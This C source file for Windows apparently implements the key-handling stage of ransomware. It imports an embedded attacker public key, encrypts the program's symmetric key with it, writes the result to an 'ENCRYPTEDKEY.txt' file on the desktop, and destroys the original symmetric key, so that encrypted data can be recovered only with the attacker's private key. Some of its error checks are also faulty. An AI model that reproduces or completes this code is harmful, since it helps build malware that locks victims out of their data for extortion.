#include <stdio.h>
#include <Windows.h>
#include "keyDef.h"

int keyCleanup(key keyStruct) {

	//ADD KEY HERE
	BYTE asymKeyData[] = {};

	//importing asym public key
	HCRYPTKEY hAsymKey;
	if (!CryptImportKey(keyStruct.hCryptoProvider, asymKeyData, sizeof(asymKeyData), 0, CRYPT_EXPORTABLE, &hAsymKey)) {
		printf("\n(!) Error importing asym key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully imported asym key");
	}

	DWORD keyLenCheck = NULL;
	if (!CryptExportKey(keyStruct.hKey, hAsymKey, SIMPLEBLOB, 0, NULL, &keyLenCheck)) {
		printf("\n(!) Error getting key size - 0x%x", GetLastError());
	} else {
		printf("\n(+) Succesfully got key size");
	}

	DWORD keyLen = keyLenCheck + 1;
	BYTE* keyData = (BYTE*)malloc(keyLen);
	if (!CryptExportKey(keyStruct.hKey, hAsymKey, SIMPLEBLOB, 0, keyData, &keyLen)) {
		printf("\n(!) Error exporting key - %i", GetLastError());
	} else {
		printf("\n(+) Succesfully exported key");
	}

	char keyHeader[] = "BYTE keyHex[] = {";
	DWORD hexedKeySize = keyLen * 6 + sizeof(keyHeader) + 2;
	char* hexedKey = (char*)malloc(hexedKeySize);
	strcpy_s(hexedKey, hexedKeySize, keyHeader);

	for (DWORD i = 0; i < keyLen; i++) {

		char hexedChar[9];
		sprintf_s(hexedChar, 9, "%02x", (char*)keyData[i]);
		strcat_s(hexedKey, hexedKeySize, " 0x");
		strcat_s(hexedKey, hexedKeySize, hexedChar);
		if ((keyLen - 1) != i) {
			strcat_s(hexedKey, hexedKeySize, ",");
		} else {
			strcat_s(hexedKey, hexedKeySize, "};");
		}
	}
	free(keyData);

	//putting encrypted key in file
	char filePath[] = "C:\\Users\\iamsd\\Desktop\\ENCRYPTEDKEY.txt";
	HANDLE fileHandle = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == NULL) {
		printf("\n(!) Failed to create file %s, Error: %lu", filePath, GetLastError());
	} else {
		printf("\n(+) Succesfully created file %s", filePath);
	}

	if (fileHandle != NULL) {
		BOOL writeReturn = WriteFile(fileHandle, hexedKey, strlen(hexedKey), NULL, NULL);
		printf("\n(+) Succesfully put encrypted key in created file");
	} else {
		printf("\n(!) Failed put content in created file %s, Error: %lu", filePath, GetLastError());
	}
	free(hexedKey);

	//deleting sym keys
	if (!CryptDestroyKey(keyStruct.hKey)) {
		printf("\n(!) Error destroying key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully destroyed key");
	}

	if (!CryptDestroyKey(hAsymKey)) {
		printf("\n(!) Error destroying key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully destroyed key");
	}

	if (!CryptReleaseContext(keyStruct.hCryptoProvider, 0)) {
		printf("\n(!) Error releasing crypto provider context - %i", GetLastError());
	} else {
		printf("\n(+) Succesfully released crypto provider context");
	}

	return 0;
}
